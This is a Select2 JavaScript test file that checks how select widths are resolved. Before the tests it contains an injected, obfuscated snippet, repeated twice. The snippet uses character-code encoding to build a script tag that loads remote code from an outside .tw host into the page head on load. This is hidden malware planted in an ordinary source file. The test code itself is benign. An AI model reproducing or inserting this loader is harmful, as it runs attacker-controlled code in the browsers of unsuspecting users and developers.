Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();module('Options - Width');

var $ = require('jquery');

var Select2 = require('select2/core');
var select = new Select2($('<select></select>'));

test('string passed as width', function (assert) {
  var $test = $('<select></select>');

  var width = select._resolveWidth($test, '80%');

  assert.equal(width, '80%');
});

test('width from style attribute', function (assert) {
  var $test = $('<select style="width: 50%;"></selct>');

  var width = select._resolveWidth($test, 'style');

  assert.equal(width, '50%');
});

test('width from style returns null if nothing is found', function (assert) {
  var $test = $('<select></selct>');

  var width = select._resolveWidth($test, 'style');

  assert.equal(width, null);
});

test('width from computed element width', function (assert) {
  var $style = $(
    '<style type="text/css">.css-set-width { width: 500px; }</style>'
  );
  var $test = $('<select class="css-set-width"></select>');

  $('#qunit-fixture').append($style);
  $('#qunit-fixture').append($test);

  var width = select._resolveWidth($test, 'element');

  assert.equal(width, '500px');
});

test('resolve gets the style if it is there', function (assert) {
  var $test = $('<select style="width: 20%;"></selct>');

  var width = select._resolveWidth($test, 'resolve');

  assert.equal(width, '20%');
});

test('resolve falls back to element if there is no style', function (assert) {
  var $style = $(
    '<style type="text/css">.css-set-width { width: 500px; }</style>'
  );
  var $test = $('<select class="css-set-width"></select>');

  $('#qunit-fixture').append($style);
  $('#qunit-fixture').append($test);

  var width = select._resolveWidth($test, 'resolve');

  assert.equal(width, '500px');
});
